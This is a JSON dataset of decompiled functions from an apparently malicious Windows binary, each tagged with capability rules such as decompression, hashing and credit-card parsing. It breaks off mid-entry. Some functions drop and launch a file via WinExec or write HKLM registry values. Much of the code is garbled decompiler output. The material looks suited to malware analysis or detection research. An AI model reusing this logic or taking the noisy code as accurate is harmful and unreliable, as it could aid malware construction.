{
    "00401120": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004012a9) overlaps instruction at (ram,0x004012a7)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nuint fcn.00401120(uint16_t *param_1)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    char *in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    code *pcVar5;\n    uint32_t uVar6;\n    uchar *puVar7;\n    uint32_t unaff_ESI;\n    int32_t *piVar8;\n    int32_t *piVar9;\n    uint32_t unaff_EDI;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    int32_t *piVar13;\n    bool bVar14;\n    float10 in_ST0;\n    ulong uVar15;\n    char *pcStack28;\n    \n    puVar7 = &stack0xfffffffc;\n    if (*0x10 != 0xc && 7 < &stack0xfffffffc) {\n        pcStack28 = pcStack28 & 0xffff | unaff_ESI << 0x10;\n    }\n    if (*param_1 != 0x5a4d) {\n        return 0;\n    }\n    if ((*param_1 < 0x5a4d) || (*param_1 >= 0x5a4d)) {\n        unaff_ESI = *(param_1 + 0x1e);\n    }\n    uVar10 = unaff_EDI ^ *(unaff_EDI + 0xe58be73);\n    piVar8 = unaff_ESI + param_1;\n    if ((CARRY4(unaff_ESI, param_1) || piVar8 == NULL) || (!CARRY4(unaff_ESI, param_1) && piVar8 != NULL)) {\n        bVar14 = *piVar8 == 0x4550;\n    }\n    else {\n        *(uVar10 - 0x7f) = *(uVar10 - 0x7f) - &stack0xffffffe8;\n        puVar7 = &stack0xfffffffd;\n        *in_EAX = *in_EAX + in_EAX;\n        bVar14 = *in_EAX == '\\0';\n        pcStack28 = in_EAX;\n    }\n    if (!bVar14) {\n        return 0;\n    }\n    iVar3 = piVar8[0x16];\n    bVar14 = false;\n    if (iVar3 != 0) {\n        return 0;\n    }\n    *(puVar7 + -4) = 0x40;\n    if ((-1 < iVar3) && (-1 >= iVar3)) {\n        piVar9 = piVar8 + 1;\n        *(uVar10 + 0x1c) = in_ST0;\n        piVar8 = piVar8 + 5;\n        bVar14 = *piVar9 < *(uVar10 + 4);\n    }\n    if ((!bVar14) && (bVar14)) {\n        out(0xbd, 0);\n        return 0;\n    }\n    if (*(param_1 + 0x1e) < 0x81) {\n        return 0;\n    }\n    if (*(param_1 + 0x1e) < 0xc0) {\n        *(puVar7 + -4) = *(param_1 + 0x1e) - 0x80;\n    }\n    uVar15 = sub.MSVCRT.dll_void____cdecl_operator_new_unsigned_int_();\n    pcVar2 = _sym.imp.MSVCRT.dll_rand;\n    *(puVar7 + -8) = uVar15;\n    if (uVar15 != 0) {\n        uVar10 = *(puVar7 + -4);\n        uVar11 = 0;\n        bVar14 = false;\n        pcVar5 = &stack0x3c728b72;\n        uVar4 = uVar10;\n        if (uVar10 != 0) {\n            do {\n                iVar3 = (*pcVar2)();\n                uVar10 = 0xff;\n                uVar12 = uVar11 + 1;\n                *(uVar11 + *(puVar7 + -8)) = iVar3 % 0xff;\n                uVar1 = *(puVar7 + -4);\n                bVar14 = SBORROW4(uVar12, uVar1);\n                uVar4 = uVar12 - uVar1;\n                uVar11 = uVar12;\n            } while (uVar12 < uVar1);\n            uVar15 = CONCAT44(iVar3 % 0xff, *(puVar7 + -8));\n            pcVar5 = pcVar2;\n        }\n        iVar3 = uVar15 >> 0x20;\n        if ((bVar14 != uVar4 < 0) || (bVar14 == uVar4 < 0)) {\n            iVar3 = *(puVar7 + 8);\n            uVar10 = *(puVar7 + -4);\n            piVar8 = uVar15;\n        }\n        uVar6 = &stack0xffffffe4 ^ *(pcVar5 + -0x75);\n        *(uVar6 - 4) = puVar7;\n        pcVar5[-0xf7403b3] = pcVar5[-0xf7403b3] | uVar10;\n        piVar9 = uVar15;\n        piVar13 = iVar3 + 0x80;\n        for (uVar4 = uVar10 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n            *piVar13 = *piVar9;\n            piVar9 = piVar9 + 1;\n            piVar13 = piVar13 + 1;\n        }\n        for (uVar10 = uVar10 & 3; uVar10 != 0; uVar10 = uVar10 - 1) {\n            *piVar13 = *piVar9;\n            piVar9 = piVar9 + 1;\n            piVar13 = piVar13 + 1;\n        }\n        *(uVar6 - 8) = 0;\n        *(uVar6 - 8) = piVar8;\n        *(uVar6 - 0xc) = 0x4012e0;\n        sub.MSVCRT.dll_void___cdecl_operator_delete_void__();\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 1430
    },
    "00403cc0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.00403cc0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    if (*0x4224a8 == 0) {\n        return 0;\n    }\n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.00401870(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x4112c4, acStack1304, &uStack2112);\n    uStack2088 = 0x41134c;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x411364;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.004017b0(auStack1564, 0x4112c0, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1870
    },
    "004012f0": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040156b) overlaps instruction at (ram,0x00401567)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x00401355)\n// WARNING: Removing unreachable block (ram,0x00401429)\n\nulong __fastcall fcn.004012f0(char *param_1, uint32_t param_2, uchar *param_3)\n\n{\n    uint8_t *puVar1;\n    char *pcVar2;\n    int64_t iVar3;\n    uint8_t uVar4;\n    uint32_t *puVar5;\n    int16_t in_AX;\n    uint16_t uVar6;\n    uint uVar7;\n    uint32_t uVar8;\n    uint uVar9;\n    char cVar12;\n    uint extraout_EDX;\n    uint uVar10;\n    uint32_t uVar11;\n    uint8_t uVar13;\n    uint32_t unaff_EBX;\n    uint *puVar14;\n    uint *puVar15;\n    uint *puVar16;\n    uint *puVar17;\n    uint32_t *unaff_ESI;\n    uint32_t uVar18;\n    int32_t iVar19;\n    uint32_t *unaff_EDI;\n    uint32_t *puVar20;\n    ushort in_SS;\n    bool bVar21;\n    bool bVar22;\n    bool bVar23;\n    float10 in_ST0;\n    float10 in_ST1;\n    float10 in_ST2;\n    char cStackY24;\n    uint16_t uStackY22;\n    uint16_t uVar24;\n    uint16_t uStack18;\n    \n    bVar22 = (POPCOUNT((in_AX + unaff_EBX | 0x11a9U) & 0xff) & 1U) == 0;\n    *param_3 = 0x94;\n    puVar17 = &stack0xfffffffc;\n    if ((!bVar22) && (puVar17 = &stack0xfffffffc,  bVar22)) {\n        puVar17 = segment(in_SS, *0x10 + -0x10);\n        uVar7 = *puVar17;\n        param_2 = 0xb7bc9ea5;\n        if (bVar22) {\n            *unaff_EDI = *unaff_ESI;\n            puVar20 = unaff_ESI + 1;\n            puVar5 = unaff_EDI + 1;\n            for (iVar19 = 1; iVar19 != 0; iVar19 = iVar19 + -1) {\n                *puVar5 = *puVar20;\n                puVar20 = puVar20 + 1;\n                puVar5 = puVar5 + 1;\n            }\n            sub.MSVCRT.dll_void___cdecl_operator_delete_void__(uVar7);\n            return CONCAT44(extraout_EDX, 1);\n        }\n        param_3 = uVar7;\n        puVar17 = &stack0xfffffffc;\n    }\n    while( true ) {\n        param_3[1] = 0x6e;\n        uVar8 = puVar17[2];\n        *(uVar8 + 2) = 0x21;\n        *(uVar8 + 3) = 0xf8;\n        uVar11 = puVar17[2];\n        *(uVar11 + 4) = 0x93;\n        uVar24 = uVar8;\n        uStack18 = uVar8 >> 0x10;\n        cStackY24 = param_1;\n        uStackY22 = param_1 >> 0x10;\n        bVar23 = false;\n        bVar22 = (POPCOUNT(cStackY24 - 5U & 0x44) & 1U) == 0;\n        *(uVar11 + 5) = 0x94;\n        uVar18 = uVar11;\n        if ((bVar22) || (!bVar22)) goto code_r0x004013d3;\n        uVar18 = *unaff_EDI;\n        *unaff_EDI = uVar11;\n        puVar17 = puVar17 - *(puVar17 + 0x5f9dff63);\n        if (-1 < puVar17) break;\n        uVar8 = uVar8 + 1;\n        param_3 = uVar8 & 0xffff0000 | CONCAT11((uVar8 >> 8) + *param_1, uVar8);\n    }\n    bVar23 = uVar18 < 0;\n    bVar22 = (POPCOUNT(uVar18 & 0xff) & 1U) == 0;\n    if (!bVar23) {\n        *(uVar18 + 0x66505266) = *(uVar18 + 0x66505266) | unaff_EBX;\n        puVar1 = puVar17 + -0x7b;\n        *puVar1 = *puVar1 << 6 | *puVar1 >> 2;\n        goto code_r0x00401439;\n    }\ncode_r0x004013d3:\n    puVar14 = &stack0xfffffff0;\n    bVar21 = false;\n    *(uVar18 + 6) = 0x8a;\n    if (bVar22) {\ncode_r0x004013e3:\n        uVar13 = param_1;\n        *(uVar18 + 7) = 0x6b;\n        puVar20 = unaff_EDI;\n        if (bVar22) goto code_r0x00401403;\n    }\n    else {\n        param_1 = param_1 & 0xffff;\n        uVar13 = param_1;\n        if (!bVar22) goto code_r0x004013e3;\n    }\n    uVar18 = uVar18 + 0x46;\n    bVar23 = uVar18 < 0;\n    iVar3 = *(param_2 + 0x1a) * -0x75;\n    puVar20 = iVar3;\n    bVar21 = puVar20 != iVar3;\n    *(unaff_EBX + 0xdb8766f6) = in_ST0;\n    in_ST0 = in_ST1;\n    in_ST1 = in_ST2;\n    if ((POPCOUNT(uVar18 & 0xff) & 1U) == 0) {\n        cVar12 = '\\x1e';\n        do {\n            puVar17 = puVar17 + -1;\n            puVar14 = puVar14 + -1;\n            *puVar14 = *puVar17;\n            cVar12 = cVar12 + -1;\n        } while ('\\0' < cVar12);\n        uVar7 = in(0x78);\n        return CONCAT44(param_2, uVar7);\n    }\ncode_r0x00401403:\n    *(uVar18 + 8) = 0x6f;\n    unaff_EDI = puVar20;\n    if ((bVar21 == bVar23) && (bVar21 != bVar23)) {\n        out(0xc4, uVar8);\n        param_2 = param_2 & 0xffffff00 | param_2 ^ uVar13;\n        unaff_EDI = puVar20 + 1;\n        *puVar20 = uVar8;\n    }\n    *(uVar18 + 9) = 0x9e;\n    uStackY22 = uVar24;\n    uVar24 = uStack18;\n    uStack18 = param_2;\ncode_r0x00401439:\n    *(uVar18 + 10) = 0xd0;\n    uVar13 = uStackY22 >> 8;\n    uVar6 = (uStackY22 & 0xff | (uVar13 - unaff_EBX) + 0x4d << 8) & 0x26ae;\n    bVar22 = -1 < uVar6 - 1;\n    *(uVar18 + 0xb) = 0xaa;\n    if ((uVar6 != 1) && (uVar6 == 1)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    *(uVar18 + 0xc) = 0xb7;\n    if ((bVar22) && (!bVar22)) {\n        *(unaff_EDI + 7) = in_ST0;\n        unaff_EDI = unaff_EDI + 5;\n        uVar18 = uVar18 + 5;\n        in_ST0 = in_ST1;\n    }\n    uVar8 = CONCAT22(uVar24, uStackY22);\n    *(uVar18 + 0xd) = 0xf0;\n    *(uVar18 + 0xe) = 0x97;\n    uVar4 = unaff_EBX >> 8;\n    uVar13 = uVar4 ^ 0x16 | uVar13;\n    cVar12 = uStack18 >> 8;\n    bVar23 = SBORROW1(uVar13, cVar12);\n    bVar22 = uVar13 - cVar12 < '\\0';\n    *(uVar18 + 0xf) = 0x5e;\n    if ((!bVar22) && (bVar22)) {\n        puVar20 = unaff_EDI + 1;\n        pcVar2 = uVar18 + 4;\n        *(unaff_EDI + 7) = in_ST0;\n        unaff_EDI = unaff_EDI + 5;\n        uVar18 = uVar18 + 5;\n        bVar23 = SBORROW1(*pcVar2, *puVar20);\n        bVar22 = *pcVar2 - *puVar20 < '\\0';\n    }\n    *(uVar18 + 0x10) = 0xc4;\n    if ((bVar23 != bVar22) || (bVar23 == bVar22)) {\n        *(uVar18 + 0x11) = 0x93;\n        uVar8 = uVar8 & 0xffffff00 | uStackY22 - 1;\n    }\n    puVar15 = &stack0xfffffff4 ^ *(unaff_EBX - 0x3a);\n    iVar19 = uVar8 + 1;\n    *(unaff_EBX + 0x66525150) = *(unaff_EBX + 0x66525150) + (param_2 & 0xffff0000 | uStack18);\n    *unaff_EDI = uVar18;\n    uVar10 = *puVar15;\n    uVar9 = puVar15[1];\n    uVar7 = puVar15[2];\n    *(uVar8 + 0x13) = 0x94;\n    puVar15[2] = uVar9;\n    puVar15[1] = uVar10;\n    bVar22 = (uVar10 ^ uVar4 | 0x67) != 0;\n    uVar11 = puVar15[1];\n    uVar18 = puVar15[2];\n    puVar16 = puVar15 + 3;\n    *(uVar8 + 0x14) = 0xf4;\n    if (bVar22) {\n        puVar15[2] = iVar19;\n        iVar19 = puVar15[2];\n        if (!bVar22) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\n    *(iVar19 + 0x14) = 0x99;\n    *(puVar15 + 10) = uVar11;\n    *(puVar15 + 6) = uVar7;\n    uVar7 = *(puVar15 + 6);\n    uVar8 = uVar11 & 0xffff0000 | *(puVar15 + 10);\n    *(iVar19 + 0x15) = 0x88;\n    if ((uVar11 < 'R') || ('Q' < uVar11)) {\n        *(iVar19 + 0x16) = 0x94;\n    }\n    else {\n        puVar16 = puVar15 + 2;\n        *(puVar15 + 2) = in_SS;\n    }\n    *(puVar16 + -4) = uVar7;\n    *(puVar16 + -8) = uVar18;\n    *(puVar16 + -0xc) = uVar8;\n    *(puVar16 + -0x10) = CONCAT31(unaff_EBX >> 8, 0x94);\n    *(puVar16 + -0x14) = puVar16;\n    *(puVar16 + -0x18) = puVar17;\n    *(puVar16 + -0x1c) = iVar19;\n    *(puVar16 + -0x20) = unaff_EDI + 1;\n    uVar11 = uVar18 & 0xffff0000 | CONCAT11((uVar18 >> 8) + 'l', uVar18);\n    iVar19 = *(puVar16 + -0x18);\n    uVar7 = *(puVar16 + -0xc);\n    uVar18 = *(iVar19 + 8);\n    *(uVar18 + 0x17) = 0x96;\n    if ((uVar8 < uVar11) && (uVar11 <= uVar8)) {\n        uVar18 = uVar18 & 0xe2f4cc58;\n    }\n    **(iVar19 + 0xc) = 0x18;\n    return CONCAT44(uVar7, uVar18);\n}\n",
        "token_count": 2990
    },
    "00404180": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __cdecl\nfcn.00404180(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, int32_t arg_20h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_10ch;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00401930(arg_18h, arg_1ch, arg_8h, 0x20, arg_20h + 0x20);\n    fcn.00401930(arg_18h, arg_1ch, arg_ch, 0x20, arg_20h + 0x60);\n    fcn.00401930(arg_18h, arg_1ch, arg_10h, 0x20, arg_20h + 0xa0);\n    fcn.00401930(arg_18h, arg_1ch, arg_14h, 0x20, arg_20h + 0xe0);\n    iVar1 = fcn.00404130();\n    if (iVar1 == -1) {\n        iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n        *(arg_20h + 0x120) = iVar1 % 5;\n    }\n    else {\n        *(arg_20h + 0x120) = iVar1;\n    }\n    var_10ch = 0;\n    puVar2 = &var_10bh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    var_4h = 0x104;\n    *(puVar2 + 2) = 0;\n    iVar1 = fcn.00403290(0x80000001, 0x411238, 0x411264, &var_8h, &var_10ch, &var_4h);\n    if ((iVar1 != 0) && (iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(),  iVar1 == 0)) {\n        iVar1 = 0;\n        *(arg_20h + 0x120) = *(arg_20h + 0x120) | 0x80;\n    }\n    return iVar1;\n}\n",
        "token_count": 568
    },
    "00401700": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401778) overlaps instruction at (ram,0x00401774)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __cdecl fcn.00401700(uint16_t *arg_8h, uint16_t *arg_ch, int32_t arg_10h)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    uint8_t uVar3;\n    uint in_EAX;\n    uint16_t *puVar4;\n    uint16_t *puVar5;\n    char in_DL;\n    int32_t *piVar6;\n    char *unaff_EBX;\n    bool bVar7;\n    uint8_t in_AF;\n    float10 in_ST0;\n    float10 in_ST1;\n    float10 in_ST2;\n    float10 in_ST3;\n    float10 in_ST4;\n    float10 in_ST5;\n    float10 in_ST6;\n    float10 in_ST7;\n    \n    uVar3 = in_EAX >> 8;\n    if ((uVar3 < in_DL + 0x15U) && (in_DL + 0x15U <= uVar3)) {\n        in_ST0 = *(arg_8h + 0x3d4b76b2) - in_ST0;\n    }\n    if (arg_10h != 0) {\n        do {\n            piVar6 = *arg_ch;\n            arg_8h = arg_8h + piVar6;\n            puVar4 = arg_8h >> 0x10;\n            bVar7 = false;\n            puVar5 = arg_ch;\n            if ((arg_8h >> 0x10 != 0) && ((arg_8h < 0 || (puVar5 = arg_8h,  arg_8h >= 0)))) {\n                bVar7 = CARRY4(puVar4, arg_8h & 0xffff);\n                puVar4 = puVar4 + (arg_8h & 0xffff);\n                puVar5 = arg_ch;\n                arg_8h = puVar4;\n            }\n            *(puVar4 + -0x3e74920a) = in_ST0;\n            uVar3 = puVar4 - 1U;\n            in_AF = 9 < (uVar3 & 0xf) | in_AF;\n            uVar3 = uVar3 + in_AF * '\\x06';\n            uVar3 = uVar3 + (0x90 < (uVar3 & 0xf0) | bVar7 | in_AF * (0xf9 < uVar3)) * '`';\n            piVar2 = puVar4 - 1U & 0xffffff00 | uVar3;\n            *piVar6 = *piVar6 + -0xda207c;\n            *piVar2 = *piVar2 + 1;\n            *(puVar5 + 0xffffe1) = *(puVar5 + 0xffffe1) + uVar3;\n            *unaff_EBX = *unaff_EBX + uVar3;\n            puVar1 = puVar5 + 0x4d8b0845;\n            *puVar1 = *puVar1 >> 0xc | *puVar1 << 0x14;\n            arg_ch = puVar5 + 1;\n            arg_10h = arg_10h + -1;\n            in_ST0 = in_ST1;\n            in_ST1 = in_ST2;\n            in_ST2 = in_ST3;\n            in_ST3 = in_ST4;\n            in_ST4 = in_ST5;\n            in_ST5 = in_ST6;\n            in_ST6 = in_ST7;\n        } while (arg_10h != 0);\n    }\n    return (arg_8h >> 0x10) + arg_8h;\n}\n",
        "token_count": 849
    },
    "00403330": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403330(uint arg_8h, int32_t arg_ch, uint *arg_10h, int32_t *arg_14h)\n\n{\n    uint32_t uVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    uVar2 = fcn.00401700(0, arg_8h, arg_ch + 1U >> 1);\n    iVar3 = (*_sym.imp.dbghelp.dll_ImageNtHeader)(arg_8h);\n    uVar1 = *(iVar3 + 0x58);\n    if (uVar2 < uVar1) {\n        iVar4 = (uVar2 - uVar1 & 0xffff) - 1;\n    }\n    else {\n        iVar4 = uVar2 - (uVar1 & 0xffff);\n    }\n    if (iVar4 < uVar1 >> 0x10) {\n        iVar4 = (iVar4 - (uVar1 >> 0x10) & 0xffff) - 1;\n    }\n    else {\n        iVar4 = iVar4 - (uVar1 >> 0x10);\n    }\n    *arg_14h = iVar4 + arg_ch;\n    *arg_10h = *(iVar3 + 0x58);\n    return;\n}\n",
        "token_count": 292
    },
    "00401930": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00401930(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    uint8_t uVar1;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_10h._0_1_ = arg_14h * '\\x02';\n    var_ch = 0;\n    if (0 < arg_14h) {\n        var_8h = 1;\n        do {\n            uVar1 = *(var_8h % arg_ch + arg_8h);\n            *(arg_18h + -1 + var_8h) = var_10h ^ *(var_ch + arg_10h) ^ *((var_8h + -1) % arg_ch + arg_8h);\n            *(var_8h + arg_18h) = var_10h ^ uVar1;\n            var_ch = var_ch + 1;\n            var_8h = var_8h + 2;\n        } while (var_ch < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 311
    },
    "00401af0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00401af0(char *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    uchar var_268h;\n    uint var_267h;\n    char var_164h;\n    uint var_163h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    char *var_4ch;\n    char *var_48h;\n    uint *var_44h;\n    uint *var_40h;\n    uint *var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.MSVCRT.dll_sprintf;\n    var_268h = 0;\n    puVar5 = &var_267h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_164h = '\\0';\n    puVar5 = &var_163h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_8h = 1;\n    var_4h = 0;\n    var_ch = 1;\n    var_10h = arg_ch != 0;\n    (*_sym.imp.MSVCRT.dll_sprintf)(*0x10 + -0x168, 0x106c, arg_8h);\n    (*pcVar2)(*0x10 + -0x26c, 0x1084, arg_8h);\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    var_4ch = &var_164h;\n    var_44h = &var_8h;\n    var_40h = &var_4h;\n    var_3ch = &var_ch;\n    uVar4 = 0xffffffff;\n    pcVar6 = &var_164h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_24h = ~uVar4 - 1;\n    uVar4 = 0xffffffff;\n    pcVar6 = arg_8h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_20h = ~uVar4 - 1;\n    var_38h = 0x4110ac;\n    var_34h = 0x4110b8;\n    var_30h = 0x4110c4;\n    var_2ch = 0x4110d4;\n    var_28h = 0x4110dc;\n    var_60h = 2;\n    var_5ch = 1;\n    var_58h = 4;\n    var_54h = 4;\n    var_50h = 4;\n    var_48h = arg_8h;\n    var_1ch = 4;\n    var_18h = 4;\n    var_14h = 4;\n    if (var_10h < 5) {\n        uVar4 = var_10h * 4;\n        do {\n            iVar3 = (*pcVar2)(0x80000002, &var_268h, *(&var_38h + uVar4), *(&var_60h + uVar4), *(&var_4ch + uVar4), \n                              *(&var_24h + uVar4));\n            if (iVar3 != 0) {\n                return 0;\n            }\n            uVar4 = uVar4 + 4;\n        } while (uVar4 < 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 1131
    },
    "00401f60": {
